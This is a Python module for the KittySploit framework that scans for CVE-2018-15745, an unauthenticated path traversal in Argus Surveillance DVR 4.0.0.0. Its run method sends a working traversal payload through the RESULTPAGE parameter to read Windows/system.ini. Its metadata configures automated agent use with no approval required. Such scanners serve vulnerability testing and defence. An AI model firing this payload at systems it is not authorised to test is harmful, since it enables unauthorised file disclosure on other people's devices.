#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Argus Surveillance DVR 4."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Argus Surveillance DVR 4.0.0.0 - Local File Inclusion Detection',
        'description': 'Argus Surveillance DVR 4.0.0.0 devices allow unauthenticated local file inclusion, leading to file disclosure via a ..%2F in the WEBACCOUNT.CGI RESULTPAGE parameter.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2018', 'packetstorm', 'edb', 'argussurveillance', 'lfi', 'dvr', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'http://hyp3rlinx.altervista.org/advisories/ARGUS-SURVEILLANCE-DVR-v4-UNAUTHENTICATED-PATH-TRAVERSAL-FILE-DISCLOSURE.txt',
            'http://packetstormsecurity.com/files/149134/Argus-Surveillance-DVR-4.0.0.0-Directory-Traversal.html',
            'https://www.exploit-db.com/exploits/45296/',
            'https://nvd.nist.gov/vuln/detail/CVE-2018-15745',
            'https://github.com/ARPSyndicate/cvemon',
        ],
        'cve': 'CVE-2018-15745',
    }

    def run(self):
        r = self.http_request(method="GET", path='/WEBACCOUNT.CGI?OkBtn=++Ok++&RESULTPAGE=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2Fsystem.ini&USEREDIRECT=1&WEBACCOUNTID=&WEBACCOUNTPASSWORD=', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('for 16-bit app support', '[drivers]',)
        if (all(m in body for m in body_all)):
            self.set_info(
                severity='high',
                reason="Argus Surveillance DVR 4.0.0.0 - Local File Inclusion detected",
                path='/WEBACCOUNT.CGI?OkBtn=++Ok++&RESULTPAGE=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2Fsystem.ini&USEREDIRECT=1&WEBACCOUNTID=&WEBACCOUNTPASSWORD=',
            )
            return True
        return False

